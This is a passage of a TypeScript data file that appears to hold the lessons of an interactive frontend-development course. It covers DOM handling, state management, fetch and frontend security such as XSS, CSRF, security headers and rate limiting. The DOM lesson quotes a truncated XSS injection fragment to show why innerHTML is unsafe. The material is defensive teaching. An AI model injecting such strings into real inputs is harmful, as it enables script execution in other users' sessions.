export type ClusterId = 'glass' | 'pieces' | 'memory' | 'wire' | 'lock' | 'keep';

export interface Cluster {
  id: ClusterId;
  label: string;
  blurb: string;
  x: number;
  y: number;
  rx: number;
  ry: number;
}

export interface LessonExample {
  method: string;
  path: string;
  goesTo: string;
  purpose: string;
  note?: string;
}

export type LessonBlock =
  | { type: 'h3'; text: string }
  | { type: 'p'; text: string }
  | { type: 'ul'; items: string[] }
  | { type: 'ol'; items: string[] }
  | { type: 'quote'; text: string }
  | { type: 'pre'; lines: string }
  | { type: 'table'; columns: string[]; rows: string[][] }
  | { type: 'hr' }
  | { type: 'kid'; text?: string; items?: string[] }
  | { type: 'callout'; lines: string[] };

export interface LessonSection {
  heading: string;
  body?: string[];
  kid?: string;
  table?: { term: string; here: string; kid: string }[];
  code?: { caption?: string; lines: string };
  examples?: LessonExample[];
  bullets?: string[];
  footer?: string[];
  blocks?: LessonBlock[];
}

export type StudioId = 'state' | 'security' | 'notice';

export interface TopicNode {
  id: string;
  n: number;
  title: string;
  label: string;
  cluster: ClusterId;
  x: number;
  y: number;
  gist: string;
  remember: string[];
  studio?: StudioId;
  sections?: LessonSection[];
}

export interface GraphEdge {
  from: string;
  to: string;
}

export const clusters: Cluster[] = [
  {
    id: 'glass',
    label: 'The glass',
    blurb: 'How the browser even shows a page, and how clicks become work.',
    x: 250,
    y: 210,
    rx: 250,
    ry: 175,
  },
  {
    id: 'pieces',
    label: 'The pieces',
    blurb: 'How UI is cut into components, reused by composition, routed, and guarded.',
    x: 720,
    y: 200,
    rx: 210,
    ry: 165,
  },
  {
    id: 'memory',
    label: 'The memory',
    blurb: 'Where truth lives on the client — local, shared, derived, URL.',
    x: 1180,
    y: 210,
    rx: 240,
    ry: 175,
  },
  {
    id: 'wire',
    label: 'The wire',
    blurb: 'Talking to servers: fetch, sockets, cache, forms. The network tab is the real API.',
    x: 280,
    y: 680,
    rx: 260,
    ry: 185,
  },
  {
    id: 'lock',
    label: 'The lock',
    blurb: 'The browser is hostile territory. The UI is not authorization.',
    x: 720,
    y: 690,
    rx: 200,
    ry: 165,
  },
  {
    id: 'keep',
    label: 'Keep-alive',
    blurb: 'What keeps a frontend honest after it ships: speed, bundles, tests.',
    x: 1180,
    y: 690,
    rx: 250,
    ry: 200,
  },
];

export const topics: TopicNode[] = [
  {
    id: 'high-level',
    n: 1,
    title: 'High-level understanding',
    label: 'High-level',
    cluster: 'glass',
    x: 110,
    y: 95,
    gist: 'A frontend is not “screens in a framework.” It is a program that runs on someone else’s computer, paints a picture from state, and asks a backend to remember what the picture cannot.',
    remember: [
      'Browser downloads HTML/CSS/JS. JS builds a tree. Pixels follow the tree. Clicks mutate state. State asks the network.',
      'The job is a trustworthy picture: the right data, the right permissions, fast enough, usable with a keyboard.',
      'React, Vue, Svelte are clothes. The DOM, the event loop, and the network tab are the body.',
    ],
    sections: [
      {
        heading: '1. The machine is not yours',
        blocks: [
          { type: 'p', text: 'Backend code runs on a box you rented. Frontend code runs on a **phone you never saw**, behind a network you do not control, with DevTools open. That is the first principle. Everything else — state, security, performance — is a consequence of “this program is a guest.”' },
          { type: 'p', text: 'The guest can **read every byte you shipped**. It can **edit every request** before it leaves. It can **ignore your CSS**. It can **refuse your JavaScript**. A frontend that assumes the opposite is a demo.' },
          { type: 'quote', text: 'The network tab is the real UI. The pixels are a courtesy.' },
          {
            type: 'kid',
            items: [
              'You mailed a coloring book. They can color outside the lines, skip pages, or photocopy the answers.',
              'You still send a nice book. You do not put the vault combination in the margin.',
            ],
          },
        ],
      },
      {
        heading: '2. Picture, memory, wire',
        blocks: [
          { type: 'p', text: 'Three jobs, always:' },
          {
            type: 'ul',
            items: [
              '**Picture** — DOM + CSS. What the human sees and pokes.',
              '**Memory** — state. The facts that, if they changed, the picture would change.',
              '**Wire** — HTTP (and friends). The only way this tab talks to truth that survives a refresh.',
            ],
          },
          { type: 'p', text: 'Frameworks mix the three so the code looks small. The bugs are still in one of those three rooms. This map names the rooms.' },
          {
            type: 'table',
            columns: ['Room', 'If you skip it', 'This map'],
            rows: [
              ['Picture', 'It looks broken. Or nobody can tab to the button.', '**2–5, 9**'],
              ['Memory', 'The badge says 0 after you added to cart.', '**10–13 · State**, **25 · Storage**'],
              ['Wire', 'The page lies, or hangs, or double-charges.', '**14–16**, **26 · WebSocket**'],
              ['Lock', 'A comment steals the session. A hidden button is the admin panel.', '**17–19 · Security**'],
              ['Keep-alive', 'It ships, then it janks. The card has 40 props.', '**20 · Perf**, **23 · Reusable**, **24 · Middleware**'],
            ],
          },
        ],
      },
      {
        heading: '3. How to walk this map',
        blocks: [
          { type: 'p', text: 'Click **11 · State** and toggle the shop. Click **17 · Security** — play the wall, then [five pillars](https://youtu.be/kCRYqHPZVzQ) and [Dimma’s front / wire / back](https://youtu.be/-GfSbk_VqSk). Then **20 · Perf**, **23 · Reusable**, **24 · Middleware**, **25 · Storage**, and **26 · WebSocket** (the live-notice studio).' },
          {
            type: 'callout',
            lines: [
              '**Clothes vs body.** Vue and React are clothes. State and the hostile browser are the body.',
              '**The UI is not a lock.** Authorization lives on the server. This map will repeat that until it sticks.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'browser',
    n: 2,
    title: 'The Browser: A Hostile Guest House With a Very Fast Painter',
    label: 'Browser',
    cluster: 'glass',
    x: 270,
    y: 70,
    gist: 'The browser is an OS for documents: it fetches, parses, paints, runs JS on one thread, and sandboxes you from the rest of the disk. You live inside its rules.',
    remember: [
      'HTML parse → DOM. CSS parse → cascade. JS can mutate both. Paint is a consequence.',
      'One JS thread. Long work janks the picture. Workers exist because of this.',
      'Same-origin is the fence. Cookies, storage, and DOM are per origin, not per “app name.”',
    ],
    sections: [
      {
        heading: '1. Origin is the unit of trust',
        blocks: [
          { type: 'p', text: 'Scheme + host + port. `https://shop.test` and `https://evil.test` are strangers. So are `https://shop.test` and `http://shop.test`. The fence is **same-origin**. `postMessage`, CORS, and cookies are holes you cut on purpose.' },
          { type: 'p', text: '“Our app” is not a browser concept. **Origin** is.' },
        ],
      },
    ],
  },
  {
    id: 'dom',
    n: 3,
    title: 'The DOM: The Tree the Pixels Obey',
    label: 'DOM',
    cluster: 'glass',
    x: 430,
    y: 120,
    gist: 'The Document Object Model is the live tree. CSS paints it. JS mutates it. Accessibility APIs read it. If it is not in the tree, it is not on screen and it is not for the keyboard.',
    remember: [
      'HTML is a serialisation. The DOM is the running object.',
      'textContent is data. innerHTML is a program if the string has tags.',
      'Query, mutate, listen — three verbs. Frameworks hide them; they still happen.',
    ],
    sections: [
      {
        heading: '1. Data vs markup',
        blocks: [
          { type: 'p', text: '`element.textContent = user.name` puts **characters** in a text node. `element.innerHTML = user.name` **parses** the string as HTML. If `user.name` is `<img src=x onerror=…>`, you just ran their code as **your origin**. That is XSS. Open **17 · Security**.' },
          { type: 'quote', text: 'The DOM does not know who typed the string. You have to.' },
        ],
      },
    ],
  },
  {
    id: 'render',
    n: 4,
    title: 'Rendering: How a Tree Becomes Pixels',
    label: 'Render',
    cluster: 'glass',
    x: 180,
    y: 250,
    gist: 'Layout, paint, composite. Change a width and you may relayout the world. Change a transform and you may only composite. Jank is usually JS or layout, not “the GPU is tired.”',
    remember: [
      'Style → layout → paint → composite. Read layout in a loop (`offsetHeight` in a for-loop) and you thrash.',
      '60fps is ~16ms per frame. A 40ms click handler is a dropped frame.',
      'Virtual DOM / compilers skip work. They do not skip physics. Huge lists still need windows.',
    ],
  },
  {
    id: 'events',
    n: 5,
    title: 'Events: The Browser Taps You on the Shoulder',
    label: 'Events',
    cluster: 'glass',
    x: 360,
    y: 280,
    gist: 'Clicks, keys, submit, popstate, fetch completing — all events. They capture down and bubble up. Your handler is a function on a queue, not a thread.',
    remember: [
      'Capture → target → bubble. `stopPropagation` is a smell unless you are a dropdown.',
      'preventDefault on submit is how SPAs do not dump the form to a new document.',
      'Delegation: one listener on a parent for many children. The DOM you have, not the DOM you wish.',
    ],
    sections: [
      {
        heading: '1. The click is not the write',
        blocks: [
          { type: 'p', text: 'A click handler should **ask to change state**, not reach into three other components and edit their labels. That habit is how the cart badge desyncs. **11 · State** is the picture of this sentence.' },
        ],
      },
    ],
  },
  {
    id: 'components',
    n: 6,
    title: 'Components: Named Pictures With a Boundary',
    label: 'Components',
    cluster: 'pieces',
    x: 620,
    y: 80,
    gist: 'A component is a function (or template) from props + local state → a piece of DOM. The boundary is the point: you can reuse it, test it, and not leak its guts.',
    remember: [
      'One job per component. Product card is not also the cart, the user, and the toast.',
      'If two components must stay in sync, they do not own the fact. The store or the parent does.',
      'Composition over a 400-prop god card.',
    ],
    sections: [
      {
        heading: '1. The boundary is the point',
        blocks: [
          { type: 'p', text: 'Split UI so **one fact has one owner**. The cart count does not live in the product card **and** the badge. That is **11 · State**. Components make the split visible. They are not a substitute for the split. When the same card grows a 40th prop, open **23 · Reusable**.' },
        ],
      },
    ],
  },
  {
    id: 'props',
    n: 7,
    title: 'Props and Events: Data Down, Intent Up',
    label: 'Props',
    cluster: 'pieces',
    x: 790,
    y: 70,
    gist: 'Parents pass data in. Children emit “I was clicked.” That is enough until the tree is deep and cousins need the same fact — then you have prop drilling, and you want a store.',
    remember: [
      'Props are inputs. Do not mutate them as if they were yours.',
      'Events are outputs. A child does not assign the parent’s state; it asks.',
      'Drilling through five layers of unused props is a signal: lift or store.',
    ],
  },
  {
    id: 'routing',
    n: 8,
    title: 'Client Routing: The URL Is a Screen, Not a Folder',
    label: 'Routing',
    cluster: 'pieces',
    x: 640,
    y: 220,
    gist: 'A path like /cart is a claim about what this tab should show. History API swaps the picture without a full document load. The server still needs to answer that URL on refresh.',
    remember: [
      'Refresh on /cart must not 404. The host (Nginx, Cloudflare, Nuxt) has to serve the app.',
      'Route params are state. Treat them as untrusted strings — **17 · Security**.',
      'Guards in the router are UX. A hidden /admin route is not authorization.',
    ],
    sections: [
      {
        heading: '1. Deep links are a promise',
        blocks: [
          { type: 'p', text: 'If I can be on a screen, I should be able to **send the URL**. Filters, tabs, and the open document belong in the path or the query. That is **13 · URL**. Client routers that only work from the home button are incomplete.' },
        ],
      },
    ],
  },
  {
    id: 'a11y',
    n: 9,
    title: 'Accessibility: The Tree Must Speak',
    label: 'A11y',
    cluster: 'pieces',
    x: 820,
    y: 240,
    gist: 'If it is not in the DOM as a real control, the keyboard and the screen reader cannot use it. Div-with-onClick is a poster, not a button.',
    remember: [
      'Use the element that already has the semantics: button, a, input, label.',
      'Name it: visible text, or aria-label when the picture is the only name.',
      'Focus order follows the tree. Do not trap it. Do not skip it.',
    ],
  },
  {
    id: 'local-state',
    n: 10,
    title: 'Local State: Memory That Should Die With the Component',
    label: 'Local',
    cluster: 'memory',
    x: 1040,
    y: 80,
    gist: 'A dropdown open, a hover, a draft in a text box — facts only this component cares about. Put those in the store and the store becomes a junk drawer.',
    remember: [
      'Ask: if this component unmounted, should the fact vanish? If yes, local.',
      'Ask: does a cousin need this fact? If yes, not local.',
      'Ephemeral UI ≠ server truth. Do not confuse “modal open” with “item in cart.”',
    ],
  },
  {
    id: 'state',
    n: 11,
    title: 'State Management: One Fact, One Place, Many Pictures',
    label: 'State',
    cluster: 'memory',
    x: 1220,
    y: 70,
    gist: 'When two components show the same fact from two copies, they will diverge. A store is not a library. It is the decision that cart, user, and price live in one place and the pictures subscribe.',
    studio: 'state',
    remember: [
      'Single source of truth. Copies drift. The toggle in this lesson is the whole idea.',
      'Write through the store. Read from the store. Do not patch a cousin’s label.',
      'Redux, Pinia, Zustand, Vue reactive, Context — clothes. Subscribe/notify is the body.',
    ],
    sections: [
      {
        heading: '1. Play the shop first',
        blocks: [
          { type: 'p', text: 'The diagram above **is** the lesson. **No state management:** click **Add to cart**. The product card may notice. The cart badge stays `0`. It has its **own copy**. **Log in** only changes the profile. The notification never hears.' },
          { type: 'p', text: '**With state management:** the same clicks write `cart` and `user` in the **central store**. Badge, profile, and notification **read that same object**. They cannot disagree, because there is nothing to disagree with.' },
          { type: 'quote', text: 'All components read from one central store. Updates sync instantly.' },
        ],
      },
      {
        heading: '2. What “state” even is',
        blocks: [
          { type: 'p', text: 'State is the data that, **if it changed, the picture would change**. Price. Cart count. Whether you are Ada or Guest. Not the shadow under the button. Not the CSS. The **facts**.' },
          { type: 'p', text: 'A frontend is a **pure-ish function** `view(state)`. Frameworks dirty the function with timers and network. The discipline still holds: **change state, then view**. Mutating the DOM by hand in three places is how you get a haunted UI.' },
          {
            type: 'kid',
            items: [
              'The chalkboard has one number for “how many cookies.” Every kid looks at **that** board.',
              'If every kid keeps their own scrap of paper, someone will still think there are zero cookies.',
            ],
          },
        ],
      },
      {
        heading: '3. Local is enough until a cousin cares',
        blocks: [
          { type: 'p', text: 'A tooltip “open” flag is **local**. Nobody else should know. The cart count is **not**. The badge in the header and the product card are **cousins**. Props can carry the number one level. Five levels of `cartCount` through layout chrome is **prop drilling**: the middle components do not care, they only forward.' },
          { type: 'p', text: 'Drilling is not evil. A store is not mandatory at 40 lines. The store earns its keep when **unrelated pictures** share a fact, or when the write happens far from the read.' },
          {
            type: 'table',
            columns: ['Fact', 'Owner', 'Why'],
            rows: [
              ['Dropdown open', 'The dropdown', 'Dies with the component.'],
              ['Cart count', 'The store', 'Header and product both show it.'],
              ['Logged-in name', 'The store', 'Profile, greeting, “Log out” everywhere.'],
              ['Draft comment text', 'The form', 'Not global until Post succeeds.'],
              ['Items from GET /cart', 'Server-state cache', 'The server is the truth. You hold a copy with a timestamp.'],
            ],
          },
        ],
      },
      {
        heading: '4. Single source of truth',
        blocks: [
          { type: 'p', text: 'The failure mode in the left toggle is not “they forgot to call `setBadge`.” It is **two variables for one fact**. You will forget a call. A new screen will not know to call. Time travel / undo becomes impossible because there is no one tape to rewind.' },
          {
            type: 'pre',
            lines: `// two clocks — they will drift
productCard.localCount += 1
// cartBadge.count is still 0

// one clock — pictures subscribe
store.cart += 1
cartBadge reads store.cart
notification reads store.cart`,
          },
          { type: 'p', text: '**Single source of truth** means: for each fact, **one writable place**. Derived numbers (`cartTotal = sum(lines)`) are **not** stored; they are computed. Store them and you will update the lines and forget the total.' },
        ],
      },
      {
        heading: '5. The store is subscribe / notify',
        blocks: [
          { type: 'p', text: 'A store is an object plus a list of listeners. **Write** changes the object and **notifies**. Each component that **read** a field re-renders. That is Redux. That is Pinia. That is a Vue `reactive()` root. That is React Context with a reducer. The library is a battery pack on this loop.' },
          {
            type: 'pre',
            lines: `store = { cart: 0, user: "Guest", price: 29 }
listeners = []

setCart(n) {
  store.cart = n
  listeners.forEach(fn => fn())
}

// CartBadge on mount:
listeners.push(() => render(store.cart))`,
          },
          { type: 'p', text: 'If you understand that, you can read any state library. If you do not, the library will feel like religion.' },
        ],
      },
      {
        heading: '6. Who is allowed to write',
        blocks: [
          { type: 'p', text: 'Reads can be many. **Writes should be boring and named.** `addToCart(productId)` — not `store.cart++` from a random tooltip. Named writes are where you later put: stock check, analytics, “max 99.” Spread mutations across components and those rules grow mold.' },
          { type: 'p', text: 'This is the frontend echo of a backend **service layer**. The store’s writers are the BLL of the tab.' },
          {
            type: 'kid',
            items: [
              'Anyone may **look** at the chalkboard.',
              'Only the teacher **changes** the number — and they say **why** (“Ada bought one”).',
            ],
          },
        ],
      },
      {
        heading: '7. Server state is not UI state',
        blocks: [
          { type: 'p', text: 'The cart on the server is **the** cart. What you have in the tab is a **cache**: it can be stale, it can fail to load, it can be mid-refetch. Libraries (TanStack Query, SWR, RTK Query, Vue Query) exist because “array in Pinia” does not model **loading / error / stale / retry**.' },
          {
            type: 'ul',
            items: [
              '**UI state** — modal open, selected tab, guest vs Ada in this session’s chrome. Lives in the client. Dies on refresh unless you persist it.',
              '**Server state** — products, cart lines, permissions. Lives behind HTTP. Treat as cache. The write is a **mutation** with a round-trip, not `array.push`.',
              '**URL state** — the screen, the filters. Lives in the address bar. Sharable. Survives refresh if the server cooperates.',
            ],
          },
          { type: 'p', text: 'Dumping GET `/api/products` into the same blob as `sidebarCollapsed` is how a store becomes a second database with no schema.' },
        ],
      },
      {
        heading: '8. Persistence is a copy, not truth',
        blocks: [
          { type: 'p', text: '`localStorage.setItem("cart", …)` makes a **copy on disk**. It is not the warehouse. It is also **readable by any JS on this origin** — which means XSS can read it. Tokens in storage are a **17 · Security** hole. A cart cache in storage is a product choice; a **session id** in storage is a mistake. The three drawers — cookie, localStorage, sessionStorage — are **25 · Storage**. A live notice that must not nag twice in one tab is **sessionStorage**, and the push that delivers it is **26 · WebSocket**.' },
        ],
      },
      {
        heading: '9. Quick map',
        blocks: [
          {
            type: 'table',
            columns: ['Move', 'Means', 'Kid version'],
            rows: [
              ['Local state', 'Dies with the component', 'A sticky note on one desk'],
              ['Lifted state', 'Parent owns, props down', 'The teacher holds the count'],
              ['Store', 'Cousins subscribe to one object', 'One chalkboard'],
              ['Derived', 'Compute, do not store', 'Do not write “2+2=4” as a third fact'],
              ['Server cache', 'Copy of their truth + status', 'A photocopy with a date stamp'],
              ['URL', 'Sharable picture of the screen', 'The page number in the book'],
            ],
          },
          {
            type: 'callout',
            lines: [
              '**One fact, one write, many reads.** That is the whole subject.',
              'Toggle the diagram until the badge moving with Add to cart feels obvious. Then the libraries are easy.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'derived',
    n: 12,
    title: 'Derived State: Compute It, Do Not Remember It',
    label: 'Derived',
    cluster: 'memory',
    x: 1380,
    y: 140,
    gist: 'If a value can be calculated from other values, storing it is a bug farm. Cart total from lines. Full name from first + last. Filtered list from list + query.',
    remember: [
      'Store sources. Compute views. `useMemo` / `computed` are caches of the computation, not second truths.',
      'When sources update, derived must follow for free — that is the point of 11 · State.',
      'If you need to set total independently of lines, it was not derived. You found a new source.',
    ],
  },
  {
    id: 'url-state',
    n: 13,
    title: 'URL as State: The Address Bar Is a Store the User Can Share',
    label: 'URL',
    cluster: 'memory',
    x: 1180,
    y: 250,
    gist: 'Filters, page, selected id, tab — if I cannot paste the URL and see the same picture, that picture is trapped in RAM. Put it in the path or the query.',
    remember: [
      'Readable keys: `?color=red&page=2` not `?s=eyJ…` unless you must.',
      'The URL is public. Do not put tokens or PII in it.',
      'Back button is a time machine for URL state. Fight it and users feel haunted.',
    ],
  },
  {
    id: 'fetch',
    n: 14,
    title: 'Fetch: The Tab Asks, the Network Answers',
    label: 'Fetch',
    cluster: 'wire',
    x: 140,
    y: 580,
    gist: 'fetch / XHR is how the picture gets facts it does not own. You send headers and a body. You receive a status, then bytes. The status is the sentence; JSON is the paragraph.',
    remember: [
      'Read the status first. 401, 403, 404, 429, 500 are different pictures. Open Backend · HTTP.',
      'Credentials: same-origin cookies vs Bearer you attached. CORS is the other origin’s yes.',
      'Abort on unmount. Ignore stale responses. Double-click submit is two fetches unless you guard.',
    ],
    sections: [
      {
        heading: '1. The network tab does not lie',
        blocks: [
          { type: 'p', text: 'When the UI is wrong, open **Network**. Method, URL, request headers, request body, status, response body. That is the conversation. The Vuex mutation is a rumor. If the POST never left, it is not a backend bug.' },
          { type: 'p', text: 'You can edit that conversation in DevTools. So can anyone. That is why **17 · Security** says the frontend is not a lock: the real client is **whatever HTTP the browser will send**, not your React form.' },
        ],
      },
    ],
  },
  {
    id: 'client-cache',
    n: 15,
    title: 'Client Cache: A Copy With an Expiry, Not a Second Database',
    label: 'Cache',
    cluster: 'wire',
    x: 320,
    y: 620,
    gist: 'HTTP cache, memory cache, stale-while-revalidate. You keep a copy so the next paint is fast. You still have to say when the copy is too old.',
    remember: [
      'Cache key = method + URL + vary headers (auth). Wrong key = wrong user’s data on screen.',
      'Invalidate on mutation. Add to cart, then GET /cart cannot be the pre-add copy.',
      'HTTP `Cache-Control` is the browser’s store. Your in-memory store is another. Name both.',
    ],
  },
  {
    id: 'forms',
    n: 16,
    title: 'Forms: Intent Packed as Fields, Then One Write',
    label: 'Forms',
    cluster: 'wire',
    x: 200,
    y: 760,
    gist: 'A form is a draft of a mutation. Validate for UX. The server validates for real. Disable double submit. Say what failed in the language of the field.',
    remember: [
      'Frontend validation is a courtesy. Backend validation is the lock. Both.',
      'Controlled vs uncontrolled is a React dialect. The principle: one draft object, one submit.',
      'File uploads are not JSON. Presigned URLs exist so the browser is not your disk.',
    ],
  },
  {
    id: 'security',
    n: 17,
    title: 'Frontend Security: The Browser Runs the Attacker’s Code Too',
    label: 'Security',
    cluster: 'lock',
    x: 620,
    y: 580,
    gist: 'Anything your JavaScript can read, an injected script can read. Anything your UI hides, the network tab still sends. The frontend is a courtesy lock on a glass door. The real lock is the server — and not treating user text as HTML.',
    studio: 'security',
    remember: [
      'Five pillars + three layers: Authn/Authz, data, attacks, infra, monitoring — on the browser, the wire, and the server.',
      'Treat user text as data. innerHTML / v-html / dangerouslySetInnerHTML are loaded guns.',
      'Tokens in localStorage are gifts to XSS. HttpOnly cookies cannot be read by JS.',
      'Hiding a button is not authorization. The API still has to say no.',
    ],
    sections: [
      {
        heading: '1. Play the comment wall first',
        blocks: [
          { type: 'p', text: 'The studio above is the whole hole. **Treat as data:** paste the XSS payload, post. You see the characters. Nothing runs.' },
          { type: 'p', text: '**Trust user HTML** + **token in localStorage:** the comment is parsed as markup. A handler runs as **your origin**. The fake session leaves the tab. That is stored XSS plus a stealable token.' },
          { type: 'p', text: '**Trust user HTML** + **HttpOnly cookie:** the handler can still run, but `document.cookie` does not include the session. You still have a problem (keylogging, defacing, phishing). You do not have an instant session export. **Defense in depth:** do not trust HTML **and** do not put the session where JS can read it.' },
          { type: 'quote', text: 'The browser does not know who wrote the string. If you parse it as HTML, it becomes your program.' },
        ],
      },
      {
        heading: '2. Five pillars — watch this, then we zoom',
        blocks: [
          { type: 'p', text: 'This video is the right **map of the whole job**, not a replacement for the comment wall. [Five essential pillars of web security](https://youtu.be/kCRYqHPZVzQ) walks Authn/Authz → data → attack prevention → infrastructure → monitoring. The last minutes are an Arcjet demo (it is a sponsored video). Steal the **pillars**. The product is optional clothes. Below is the same talk, slower, with “what is this tab’s job vs the server’s job” on every pillar — because a frontend map that pretends SQLi lives in Vue is how you ship a pretty lock on a glass door.' },
          {
            type: 'table',
            columns: ['Pillar (the video)', 'The question', 'This tab', 'The server'],
            rows: [
              ['1. Authn + Authz', 'Who are you, and what may you do?', 'Show the right chrome. Send the cookie. Handle 401/403.', 'Prove identity. Check **this row / this action**. Default deny.'],
              ['2. Data', 'How does a secret travel, sit, and get used?', 'HTTPS. Never put keys in the bundle. Validate for UX.', 'Encrypt at rest. Validate for real. Keys in a vault.'],
              ['3. Attack prevention', 'What language did that string become?', 'XSS, CSRF, headers, sanitizers. The studio above.', 'SQLi parameters. Same CSRF/SameSite. Helmet-style headers.'],
              ['4. Infrastructure', 'Can they knock the door off?', 'Debounce. Do not retry-storm.', 'Rate limits, bot/WAF, graceful degrade. Cloudflare / app limits.'],
              ['5. Monitoring', 'Will we notice?', 'Client errors, CSP reports.', 'Logs (IP, time, UA, user). Alerts. Dependency audit.'],
            ],
          },
          { type: 'quote', text: 'Five rooms. XSS is one room. A frontend that only studies XSS still fails login stuffing, leaked keys, and a silent 3am.' },
        ],
      },
      {
        heading: '3. Pillar 1 — who you are is not what you may do',
        blocks: [
          { type: 'p', text: 'The video’s first line is the one teams still mash: **authentication** proves identity (badge). **Authorization** decides the locker (this invoice, this admin function). Logging in is not “admin.” A role named `editor` is not “may delete user 17.” Open Backend · Auth if you want the server half in full. Here is the frontend cut.' },
          { type: 'p', text: '**Do not roll your own auth** as a weekend project. Password reset, MFA, session fixation, account linking, credential stuffing — that is a product. Use a provider (Auth0, Clerk, Firebase Auth, your IdP) or SSO (Google / GitHub / Microsoft) when the product allows it. Users already trust those login boxes; you inherit their lock and their incident response. “I hashed with SHA-256 in localStorage” is not a provider.' },
          { type: 'p', text: '**RBAC** (role-based access control) is a table: role → permissions. `user`, `editor`, `admin` are labels. The **check** is `can(user, "invoice:delete", invoiceId)` on the **server**. The SPA may `v-if="canDelete"` so Ada does not see a dead button. That `v-if` is **manners**. The video says “validate on both client and server; never trust client-side checks alone.” The second half of that sentence is the whole frontend security course. The first half is UX. Section 14 below is this pillar with the button ripped off.' },
          {
            type: 'kid',
            items: [
              'The nametag says Ada. That is Authn.',
              'The janitor key vs the principal’s key is Authz. A sticker that says “principal” on a nametag is not a key.',
            ],
          },
        ],
      },
      {
        heading: '4. Pillar 2 — data in transit, at rest, in use',
        blocks: [
          { type: 'p', text: 'The video splits data into **three states**. That split is how you stop saying “we encrypt” as a vibe.' },
          {
            type: 'ul',
            items: [
              '**In transit** — moving on the wire. **HTTPS is not optional.** Cafe Wi-Fi plus HTTP is a postcard. `Secure` cookies only ride HTTPS. Mixed content (HTTPS page, HTTP script) is the browser trying to save you; do not un-save it. A **301 to HTTPS is not enough**: the first hop is still plaintext. **HSTS** (`Strict-Transport-Security`) tells the browser “never try HTTP again” so the user typing `http://` never sends that first postcard. Dimma’s [front / wire / back walkthrough](https://youtu.be/-GfSbk_VqSk) is the MITM coffee-shop picture.',
              '**At rest** — sitting on a disk or in a DB. That is almost never the frontend. Encryption keys do **not** live in `VITE_*` / `NUXT_PUBLIC_*`. Those names mean **the tab can read them**. Vault / env on the server. Section 15.',
              '**In use** — being parsed, shown, stored in memory. **Never trust user input** — forms, query params, file names, webhooks, the JSON you displayed because “it came from our API” (an XSS’d page can change that JSON). Frontend validation is a courtesy (wrong email shape). Backend validation is the lock. Both. Open **16 · Forms**.',
            ],
          },
          { type: 'p', text: 'Credit cards: you usually **must not** touch PAN in your JS. Stripe (and friends) tokenize in **their** iframe. A publishable key in the bundle is **meant** to leak; the secret key is not. If you invent “we encrypt the card in localStorage,” you have become a PCI problem.' },
        ],
      },
      {
        heading: '5. Pillar 3 — XSS, SQLi, CSRF, headers (the attack room)',
        blocks: [
          { type: 'p', text: 'This is the room our studio lives in. The video’s list is the industry list. Slow version:' },
          { type: 'h3', text: 'XSS — the comment wall' },
          { type: 'p', text: 'He says: sanitize before display, use a real library (`sanitize-html`, DOMPurify), never concatenate user text into HTML, add **CSP** as an extra layer. That matches the XSS section below. The missing sentence (ours): **framework interpolations already escape.** The hole is `v-html` / `dangerouslySetInnerHTML` / markdown-to-HTML / `innerHTML`. CSP is a **net**, not the fix — same as a DML-only DB user after you already parameterized SQL.' },
          { type: 'h3', text: 'SQL injection — not a Vue problem' },
          { type: 'p', text: 'The video is right: **never** `"SELECT … " + userInput`. Use **parameterized queries** / an ORM that parameterizes (Prisma, etc.). That code does not run in the tab. If your frontend “escapes SQL” before fetch, an attacker skips your SPA. Open Backend · Security. Know it exists so you do not think `sanitize-html` on a comment also saved the database.' },
          { type: 'h3', text: 'CSRF' },
          { type: 'p', text: 'Evil page + your cookie + a state-changing request. CSRF tokens in forms; many frameworks ship this. **SameSite** cookies do most of the modern work. JSON + custom header is another belt. Later section on CSRF.' },
          { type: 'h3', text: 'Security headers' },
          { type: 'p', text: 'He points at Helmet-style headers on **every production app**. These are **HTTP response headers** from the server / edge, not a Vue plugin that paints a padlock:' },
          {
            type: 'table',
            columns: ['Header', 'In one line'],
            rows: [
              ['`Content-Security-Policy`', 'Which origins may run script / load img. Nonces or hashes beat `unsafe-inline`.'],
              ['`Strict-Transport-Security`', 'Always HTTPS after first visit. Stops SSL-strip on return trips.'],
              ['`X-Content-Type-Options: nosniff`', 'Do not guess MIME. A `.txt` is not a script.'],
              ['`X-Frame-Options` / CSP `frame-ancestors`', 'Do not let evil.test iframe you (clickjacking).'],
              ['`Referrer-Policy`', 'How much of your URL leaks when you link out.'],
            ],
          },
          { type: 'p', text: 'A header you set in Nginx / Nitro / Cloudflare is a lock the **browser** enforces. A comment in a React README is not.' },
        ],
      },
      {
        heading: '6. Pillar 4 — rate limits, bots, dying slowly',
        blocks: [
          { type: 'p', text: 'Infrastructure in the video means: **the door can be knocked off** even if every query is parameterized. Login stuffing, scrapers, a loop that `fetch`es your API 10,000 times from one tab (or one botnet).' },
          { type: 'p', text: '**Rate limiting** is a budget. His token-bucket sketch: capacity 10, refill 5 every 10 seconds, each request costs 5 — so a burst of two requests empties you, then you wait. The numbers are an example. The idea is **tokens in a bucket, time puts tokens back, a request spends tokens, zero means 429.** Do it **per user id** when you have one, **per IP** when you do not, **globally** so a spray still trips a wire. Layers, not one knob. That lives on the **edge or the API**. The frontend should not invent a “max 10 clicks” that DevTools can delete. The frontend **should** debounce search and disable double-submit so **honest** users do not light themselves up.' },
          { type: 'p', text: '**DoS / bots:** Cloudflare / AWS Shield at the cloud; something in the app that can still say no when the CDN is a miss. **Graceful degradation** — under load, drop the nice-to-haves (recommendations, live presence) before you 500 the checkout. That is product + backend. The tab can show a calm “try again.” It cannot be the rate limiter.' },
        ],
      },
      {
        heading: '7. Pillar 5 — if you do not look, it did not happen',
        blocks: [
          { type: 'p', text: 'The video’s last non-ad point: protections you never observe are decorations. Log **IP, timestamp, user agent**, and **which user / route** when you can. Alert on login spikes, 401 storms, CSP violations. Keep dependencies updated — yesterday’s cute npm picker is today’s XSS. Security is a **loop**, not a launch checklist.' },
          { type: 'p', text: 'Frontend share: ship an error reporter (stack + URL, not the session cookie). CSP `report-uri` / `report-to` so a slipped `v-html` lights a dashboard. Do not `console.log` access tokens. The rest of Observe is Backend · Observe on the other map.' },
        ],
      },
      {
        heading: '8. Three layers — Dimma’s front, wire, and back',
        blocks: [
          { type: 'p', text: 'The five-pillars video is a **checklist of rooms**. [Dimma’s web security talk](https://youtu.be/-GfSbk_VqSk) (Berlin, fintech, the interview-flavored one) is the **architecture**: draw the app as **browser → network → server/DB**, then ask the attacker questions on each slice. He is explicit that this is **front and back in one sitting** — which is why it belongs on both maps. Watch it after the comment wall. The rest of this lesson is the slow notes.' },
          {
            type: 'ul',
            items: [
